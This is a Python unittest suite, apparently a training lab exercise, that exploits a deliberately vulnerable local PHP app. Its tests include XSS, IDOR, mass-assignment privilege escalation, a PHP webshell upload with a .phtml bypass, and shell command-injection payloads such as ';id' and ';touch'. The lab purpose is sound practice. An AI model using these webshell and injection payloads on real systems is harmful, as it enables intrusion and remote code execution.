"""
Day 23 — Exam Simulation 1
Vulnerability Test Suite for Vulnerable PHP App (StudyPortal)
Covers: XSS, IDOR, Mass Assignment Privesc, File Upload RCE, Command Injection
"""

import unittest
import requests
import os
import time

BASE_URL = "http://127.0.0.1:8080/vulnerable_app.php"

# ──────────────────────────────────────────────────────────
# Helpers
# ──────────────────────────────────────────────────────────

def login(username="alice", password="alice123") -> requests.Session:
    """Returns an authenticated session for the given user."""
    s = requests.Session()
    s.post(BASE_URL, params={"action": "login"}, data={
        "username": username,
        "password": password
    })
    return s

def login_admin() -> requests.Session:
    return login("admin", "password")

def login_alice() -> requests.Session:
    return login("alice", "alice123")

def login_bob() -> requests.Session:
    return login("bob", "bob456")


# ══════════════════════════════════════════════════════════
# TEST SUITE
# ══════════════════════════════════════════════════════════

class TestStudyPortalVulns(unittest.TestCase):

    # ── VULN 2: Reflected XSS on Login ────────────────────
    def test_reflected_xss_login(self):
        """
        XSS — Username reflected raw into error message.
        Payload: <script>alert(1)</script>
        Expected: script tag present in response body unescaped.
        """
        payload = "<script>alert(1)</script>"
        r = requests.post(BASE_URL, params={"action": "login"}, data={
            "username": payload,
            "password": "wrong"
        })
        self.assertEqual(r.status_code, 200)
        self.assertIn("<script>alert(1)</script>", r.text,
            "Reflected XSS confirmed: script tag unescaped in response")

    # ── VULN 3: Weak Hashing ───────────────────────────────
    def test_weak_hash_crack(self):
        """
        Weak Hashing — passwords stored as unsalted MD5.
        Simulates cracking: md5('password') = 5f4dcc3b5aa765d61d8327deb882cf99
        Expected: Admin account cracked via rainbow table lookup.
        """
        import hashlib
        wordlist = ["password", "admin", "123456", "letmein", "qwerty"]
        known_hash = "5f4dcc3b5aa765d61d8327deb882cf99"  # admin's hash

        cracked = None
        for word in wordlist:
            if hashlib.md5(word.encode()).hexdigest() == known_hash:
                cracked = word
                break

        self.assertIsNotNone(cracked,
            "MD5 crack failed — not in wordlist")
        self.assertEqual(cracked, "password",
            f"Weak hash cracked: admin's password is '{cracked}'")

    # ── VULN 4: IDOR — Access other user's notes ──────────
    def test_idor_note_access(self):
        """
        IDOR — Bob can access Alice's private notes (id=1,2).
        Note #2 contains: 'Secret project notes — API key: sk-1234ABCD'
        Expected: Bob sees Alice's note content without authorization.
        """
        s = login_bob()

        # Alice's notes are id=1 and id=2
        r = s.get(BASE_URL, params={"action": "note", "id": 2})

        self.assertEqual(r.status_code, 200)
        self.assertIn("sk-1234ABCD", r.text,
            "IDOR confirmed: Bob accessed Alice's private note with API key")

    def test_idor_admin_note(self):
        """
        IDOR escalation — Regular user accesses admin's note (id=4).
        Expected: Admin credential backup visible to alice.
        """
        s = login_alice()
        r = s.get(BASE_URL, params={"action": "note", "id": 4})

        self.assertEqual(r.status_code, 200)
        self.assertIn("SuperSecret99", r.text,
            "IDOR → Privilege escalation: Alice read admin's private note")

    # ── VULN 5: Reflected XSS on Search ───────────────────
    def test_reflected_xss_search(self):
        """
        XSS — Search query reflected raw in result and input value attr.
        Payload: "><script>alert(1)</script>
        Expected: script tag in response body.
        """
        s = login_alice()
        payload = '"><script>alert(1)</script>'
        r = s.get(BASE_URL, params={"action": "search", "q": payload})

        self.assertEqual(r.status_code, 200)
        self.assertIn("<script>alert(1)</script>", r.text,
            "Reflected XSS on search confirmed")



    # ── VULN 7: Mass Assignment → Privilege Escalation ────
    def test_mass_assignment_role_escalation(self):
        """
        Mass Assignment — POST to /profile merges all params into $_SESSION.
        Payload: POST role=admin
        Expected: Session role becomes 'admin', admin panel now accessible.
        """
        s = login_alice()

        # Step 1: Overwrite role via profile update
        s.post(BASE_URL, params={"action": "profile"}, data={
            "display_name": "Alice",
            "role": "admin"          # mass assignment payload
        })

        # Step 2: Try to access admin panel
        r = s.get(BASE_URL, params={"action": "admin"})

        self.assertEqual(r.status_code, 200)
        self.assertIn("Admin Panel", r.text,
            "Mass Assignment privesc confirmed: Alice escalated to admin role")
        self.assertNotIn("403", r.text)

    def test_mass_assignment_user_overwrite(self):
        """
        Mass Assignment — Overwrite session user to impersonate admin.
        Payload: POST user=admin role=admin
        Expected: Portal treats session as admin user.
        """
        s = login_alice()
        s.post(BASE_URL, params={"action": "profile"}, data={
            "user": "admin",
            "role": "admin"
        })
        r = s.get(BASE_URL, params={"action": "dashboard"})

        self.assertEqual(r.status_code, 200)
        self.assertIn("admin", r.text,
            "Session user overwritten to admin via mass assignment")

    # ── VULN 9/10: Unrestricted File Upload → RCE ─────────
    def test_file_upload_php_webshell(self):
        """
        Unrestricted File Upload — No extension or MIME check.
        Upload a .php webshell to /uploads/, then execute via GET.
        Expected: Shell command output returned in response.
        """
        s = login_alice()

        # Step 1: Upload PHP webshell
        webshell = b"<?php echo shell_exec($_GET['cmd']); ?>"
        r = s.post(BASE_URL, params={"action": "upload"}, files={
            "file": ("shell.php", webshell, "application/x-php")
        })

        self.assertEqual(r.status_code, 200)
        self.assertIn("shell.php", r.text,
            "File upload accepted .php — no extension check")

        # Step 2: Execute the webshell
        rce = requests.get(
            "http://127.0.0.1:8080/uploads/shell.php",
            params={"cmd": "id"}
        )

        self.assertEqual(rce.status_code, 200)
        self.assertIn("uid=", rce.text,
            "File Upload → RCE confirmed: id command output returned")

    def test_file_upload_phtml_bypass(self):
        """
        Extension bypass — Try .phtml if .php is blocked.
        Some servers execute .phtml as PHP.
        """
        s = login_alice()
        webshell = b"<?php echo shell_exec($_GET['cmd']); ?>"
        r = s.post(BASE_URL, params={"action": "upload"}, files={
            "file": ("shell.phtml", webshell, "text/plain")
        })
        self.assertEqual(r.status_code, 200)
        self.assertIn("shell.phtml", r.text,
            ".phtml upload accepted — alternate extension bypass works")

    # ── VULN 12: OS Command Injection via Ping ─────────────
    def test_command_injection_ping_id(self):
        """
        Command Injection — host passed directly to shell_exec.
        Payload: 127.0.0.1;id
        Expected: 'uid=' in response (id command output).
        """
        s = login_alice()
        r = s.post(BASE_URL, params={"action": "ping"}, data={
            "host": "127.0.0.1;id"
        })
        self.assertEqual(r.status_code, 200)
        self.assertIn("uid=", r.text,
            "Command injection confirmed via ping: id output returned")

    def test_command_injection_ping_file_write(self):
        """
        Command Injection escalation — write a file to confirm RCE.
        Payload: 127.0.0.1;touch /tmp/pwned_php
        """
        s = login_alice()
        s.post(BASE_URL, params={"action": "ping"}, data={
            "host": "127.0.0.1;touch /tmp/pwned_php"
        })
        self.assertTrue(
            os.path.exists("/tmp/pwned_php"),
            "Command injection confirmed: /tmp/pwned_php created via ping"
        )

    def test_command_injection_blind_sleep(self):
        """
        Blind Command Injection — confirm via time delay.
        Payload: 127.0.0.1;sleep 3
        Expected: response takes >= 3 seconds.
        """
        s = login_alice()
        start = time.time()
        s.post(BASE_URL, params={"action": "ping"}, data={
            "host": "127.0.0.1;sleep 3"
        }, timeout=10)
        elapsed = time.time() - start

        self.assertGreaterEqual(elapsed, 3,
            f"Blind command injection confirmed via delay: {elapsed:.2f}s")

    def test_command_injection_pipe(self):
        """
        Pipe variant — use | instead of ; for injection.
        Payload: 127.0.0.1 | whoami
        """
        s = login_alice()
        r = s.post(BASE_URL, params={"action": "ping"}, data={
            "host": "127.0.0.1 | whoami"
        })
        self.assertEqual(r.status_code, 200)
        print(f"[pipe injection] Response snippet: {r.text[200:400]}")

    
    # ── Admin Panel Access (combined chain) ───────────────
    def test_full_chain_alice_to_admin_panel(self):
        """
        Full exploit chain:
        1. Login as alice
        2. Mass assignment → role=admin
        3. Access admin panel
        4. Read all password hashes
        """
        s = login_alice()

        # Step 1: Mass assignment
        s.post(BASE_URL, params={"action": "profile"}, data={"role": "admin"})

        # Step 2: Access admin panel
        r = s.get(BASE_URL, params={"action": "admin"})
        self.assertIn("5f4dcc3b5aa765d61d8327deb882cf99", r.text,
            "Full chain confirmed: Alice → admin panel → all hashes exposed")


# ══════════════════════════════════════════════════════════
# RUNNER
# ══════════════════════════════════════════════════════════
if __name__ == "__main__":
    print("=" * 60)
    print("  PHP Vuln Test Suite — Day 23 Sim 1")
    print("  Target:", BASE_URL)
    print("  Ensure PHP app is running:")
    print("    php -S 127.0.0.1:8080")
    print("  Create uploads dir:")
    print("    mkdir -p uploads && chmod 777 uploads")
    print("=" * 60)
    unittest.main(verbosity=2)